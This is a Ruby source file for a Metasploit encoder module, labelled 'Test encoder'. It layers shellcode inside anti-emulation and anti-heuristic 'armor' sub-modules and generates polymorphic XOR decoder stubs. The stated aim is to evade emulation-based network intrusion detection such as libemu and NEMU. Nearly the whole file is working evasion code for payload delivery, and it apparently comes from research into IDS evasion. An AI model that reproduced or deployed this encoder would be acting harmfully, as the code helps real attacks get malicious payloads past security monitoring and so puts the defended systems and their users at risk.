##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'

# Anti-Emulation
require 'ebnids/emul/detect'
require 'ebnids/emul/faith'
require 'ebnids/emul/ckpe'
require 'ebnids/emul/harmor'
require 'ebnids/emul/timeout'
require 'ebnids/emul/antidis'

# Anti-Heuristic
require 'ebnids/heuristic/getpcseed'
require 'ebnids/heuristic/prt'
require 'ebnids/heuristic/egghunt'
require 'ebnids/heuristic/wx'

class Metasploit3 < Msf::Encoder::Xor

  #
  # Armor sub-module ID-class array
  # TODO: make it easier to develop additional armoring sub-modules by dynamically loading this
  #

  @@sub_modules = {
    0 => Ebnids::PlaintextArmor,
    1 => Ebnids::DetectLibemu,
    2 => Ebnids::DetectNEMU_GP,
    3 => Ebnids::DetectNEMU_CPUID,
    4 => Ebnids::DetectTiming,
    5 => Ebnids::GetPC_StackScan,
    6 => Ebnids::GetPC_StackConstruct,
    7 => Ebnids::PRT_Relocater,
    8 => Ebnids::PRT_StackConstruct,
    9 => Ebnids::FaithArmor_FPU,
    10 => Ebnids::FaithArmor_MMX,
    11 => Ebnids::FaithArmor_SSE,
    12 => Ebnids::FaithArmor_OBSOL,
    13 => Ebnids::Egghunt_API,
    14 => Ebnids::CKPEArmor,

    18 => Ebnids::RDATimeoutArmor,
    19 => Ebnids::WXArmor,
    20 => Ebnids::HashArmor,
    21 => Ebnids::AntiDisArmor
  }

  @@armor = nil
  @@getpc_reg = 0

  def initialize
    super(
      'Name'             => 'Test encoder',
      'Description'      => %q{
        Test encoder.
      },
      'Author'           => 'Jos Wetzels',
      'License'          => MSF_LICENSE,
      'Arch'             => ARCH_ALL,
      'Decoder'          =>
        {
          'KeySize'    => 4,
          'BlockSize'  => 4,
        })

      register_options(
      [
        OptString.new('ARMORS',
          [ true,
          "In-order (bottom-up) comma-separated list of selected armoring sub-modules",
          "0"]),

        OptString.new('CKPE_TYPE', [ true, "CKPE keygen type", "0" ]),
        OptString.new('CKPE_MEMORY_ADDRESS', [ true, "Memory address for CKPE keygen type 0", "0x00402000" ]),
        OptString.new('CKPE_KEY', [ true, "CKPE key", "0xFFFFFFFF" ]),
      ], self.class)
  end


  #
  # Simple XOR-based decoder stub
  #
  # [+] Features:
  #       + Lightly polymorphic (randomized registers, multiple decoder types)
  #
  # [-] Limitations:
  #       - This assumes a user-specified register (getpc_reg) holds the PC obtained by previously executed getPC code and that this stub is directly followed by the encoded body
  #
  # [*] Note:
  #       - This can be futher improved by introducing additional decoder types, randomizing current instruction order and extra registers (eg. counter register for non-loop instruction loops)
  #         and applying light metamorphism (equivalence substitution on their basic instructions, junk instructions, etc.)
  #
  #         Eg.: https://github.com/rapid7/metasploit-framework/blob/master/modules/encoders/x86/shikata_ga_nai.rb
  #              https://github.com/OpenWireSec/metasploit/blob/master/lib/rex/encoder/bloxor/bloxor.rb
  #
  def decoder_stub_instructions(state, keyReg, keyFillerLength)

    # Can't use ECX because it is used as our counter register, can't use keyReg either
    gp_regs = Array[Rex::Arch::X86::EAX, Rex::Arch::X86::EDX, Rex::Arch::X86::EBX, Rex::Arch::X86::ESI, Rex::Arch::X86::EDI] - Array[keyReg]

    # pointer reg
    gp_regs.shuffle
    ptrReg = gp_regs[0]

    decoder_stubs = []

    decoder_stubs << Rex::Arch::X86.mov_reg(ptrReg, @@getpc_reg) + # getpc_reg contains EIP
                     Rex::Arch::X86.sub(-(17 + keyFillerLength), ptrReg, state.badchars, false, true) + # sub ptrReg,-21 (ptrReg now points to shellcode area)

                     Rex::Arch::X86.sub(-(((state.buf.length - 1) / 4) + 1), Rex::Arch::X86::ECX, state.badchars) + # ecx => 0 ; sub ecx,-(((length of shellcode -1) / 4) + 1) => ecx = (((length of shellcode -1) / 4) + 1)

                     #"\x81" + (0x30 | ptrReg).chr + "XORK" + # xor [ptrReg],XORK
                     "\x31" + (0x00 + ptrReg + (8 * keyReg)).chr + # xor [ptrReg], keyReg
                     Rex::Arch::X86.sub(-4, ptrReg, state.badchars,false,true) + # sub ptrReg,-4
                     Rex::Arch::X86.loop(-7) # loop decoder


    decoder_stubs << Rex::Arch::X86.mov_reg(ptrReg, @@getpc_reg) + # getpc_reg contains EIP
                     Rex::Arch::X86.sub(-(20 + keyFillerLength), ptrReg, state.badchars, false, true) + # sub ptrReg,-24 (ptrReg now points to shellcode area)

                     Rex::Arch::X86.sub(-(((state.buf.length - 1) / 4) + 1), Rex::Arch::X86::ECX, state.badchars) + # ecx => 0 ; sub ecx,-(((length of shellcode -1) / 4) + 1) => ecx = (((length of shellcode -1) / 4) + 1) 

                     #------------------
                     # TODO: randomize this order (as long as xor comes before sub ptrReg)
                     #"\x81" + (0x30 | ptrReg).chr + "XORK" + # xor [ptrReg],XORK
                     "\x31" + (0x00 + ptrReg + (8 * keyReg)).chr + # xor [ptrReg], keyReg

                     "\x49" + # DEC ECX
                     Rex::Arch::X86.sub(-4, ptrReg, state.badchars,false,true) + # sub ptrReg,-4
                     #------------------

                     Rex::Arch::X86.test_reg(Rex::Arch::X86::ECX, Rex::Arch::X86::ECX) +
                     Rex::Arch::X86.jnz(-10) # jnz XOR (decoder loop)


    decoder_stubs << Rex::Arch::X86.mov_reg(Rex::Arch::X86::ESI, @@getpc_reg) + # getpc_reg contains EIP
                     Rex::Arch::X86.sub(-(18 + keyFillerLength), Rex::Arch::X86::ESI, state.badchars, false, true) + # sub ESI,-21 (ESI now points to shellcode area)

                     Rex::Arch::X86.sub(-(((state.buf.length - 1) / 4) + 1), Rex::Arch::X86::ECX, state.badchars) + # ecx => 0 ; sub ecx,-(((length of shellcode -1) / 4) + 1) => ecx = (((length of shellcode -1) / 4) + 1)

                     Rex::Arch::X86.mov_reg(Rex::Arch::X86::EDI, Rex::Arch::X86::ESI) + 
                     "\xAD" + # LODSD
                     #"\x35" + "XORK" + # xor eax,XORK
                     Rex::Arch::X86.xor_reg(Rex::Arch::X86::EAX, keyReg) + # xor eax, keyReg
                     "\xAB" + # STOSD
                     Rex::Arch::X86.loop(-6) # loop decoder


    decoder_stubs << Rex::Arch::X86.mov_reg(Rex::Arch::X86::ESI, @@getpc_reg) + # getpc_reg contains EIP
                     Rex::Arch::X86.sub(-(21 + keyFillerLength), Rex::Arch::X86::ESI, state.badchars, false, true) + # sub ESI,-24 (ESI now points to shellcode area)

                     Rex::Arch::X86.sub(-(((state.buf.length - 1) / 4) + 1), Rex::Arch::X86::ECX, state.badchars) + # ecx => 0 ; sub ecx,-(((length of shellcode -1) / 4) + 1) => ecx = (((length of shellcode -1) / 4) + 1)                     

                     Rex::Arch::X86.mov_reg(Rex::Arch::X86::EDI, Rex::Arch::X86::ESI) + 

                     #------------------
                     # TODO: randomize this order (as long as functionality is maintained)
                     "\xAD" + # LODSD
                     #"\x35" + "XORK" + # xor eax,XORK
                     Rex::Arch::X86.xor_reg(Rex::Arch::X86::EAX, keyReg) + # xor eax, keyReg
                     "\xAB" + # STOSD
                     "\x49" + # DEC ECX
                     #------------------

                     Rex::Arch::X86.test_reg(Rex::Arch::X86::ECX, Rex::Arch::X86::ECX) +
                     Rex::Arch::X86.jnz(-9) # jnz decoder loop

    decoder_stubs
  end

  def decoder_stub(state)
    #TODO: stub = Rex::Poly::LogicalBlock.new('stub',*decoder_stub_instructions(state))
    #decoder = stub.generate()

    # Can't use ECX because it is used as our counter register, can't be the same as our getpc register either
    gp_regs = Array[Rex::Arch::X86::EAX, Rex::Arch::X86::EDX, Rex::Arch::X86::EBX, Rex::Arch::X86::ESI, Rex::Arch::X86::EDI] - Array[@@getpc_reg]
    gp_regs.shuffle
    keyReg = gp_regs[0]

    keyFiller = @@armor.fillKeyReg(keyReg, 0x4B524F58) # XORK (will be replaced automatically by decoder_key_offset)

    decoder = keyFiller + decoder_stub_instructions(state, keyReg, keyFiller.bytesize)[0]

    # Calculate the offset to the XOR key
    offset = decoder.index('XORK')
    if(offset != nil)
      state.decoder_key_offset = offset
    end

    return decoder
  end

  #
  # Overridden to support custom-set CKPE keys (instead of context-keys read from memory maps only as per EnableContextEncoding)
  #
  def obtain_key(buf, badchars, state)
    # TODO: only do this if we are currently in a CKPE armor iteration
    if(datastore.has_key?('CKPE_KEY'))
      keyVal = datastore['CKPE_KEY'].hex
    else
      keyVal = super(buf, badchars, state)
    end

    @@armor.setKeyVal(keyVal)
    return keyVal
  end

  #
  # Override encode method to support layered wrapping of payload in multiple evasion-encoders
  #
  def encode(buf, badchars = nil, state = nil, platform = nil)
    
    # TODO: add automatic order determining, inter-encoder conflict resolution, etc.

    # In-order (bottom-up) array of evasion-encoder IDs
    encoders = datastore['ARMORS'].split(",").map { |s| s.to_i }

    enc = buf

    # Start actual encoding process
    for i in 0..(encoders.length - 1)
      gp_regs = Array[Rex::Arch::X86::EAX, Rex::Arch::X86::ECX, Rex::Arch::X86::EDX, Rex::Arch::X86::EBX, Rex::Arch::X86::ESI, Rex::Arch::X86::EDI]

      # PC storage reg
      index = Random.rand(6)

      @@getpc_reg = gp_regs[index]

      @@armor = @@sub_modules[encoders[i]].new

      metadata = {'buf' => buf,
                  'enc' => enc,
                  'badchars' => badchars,
                  'state' => state,
                  'platform' => platform,
                  'datastore' => datastore
      }

      @@armor.initMetaData(metadata)

      # enc = decoder_stub + encoded(buf)
      enc = super(enc, badchars, state, platform)

      @@armor.updateMetadata('enc', enc)
      
      # Generate getPC stub
      getpc_stub = @@armor.getPCStub(@@getpc_reg)

      # enc = getpc_stub + decoder_stub + encoded(buf)
      enc = getpc_stub + enc

      # Use armor's custom encoder when necessary (eg. for hash armoring)
      if (@@armor.getProperty('hasEncoder') == 1)
        enc = @@armor.encode(enc)
      end
     
    end
    
    return enc
  end

end
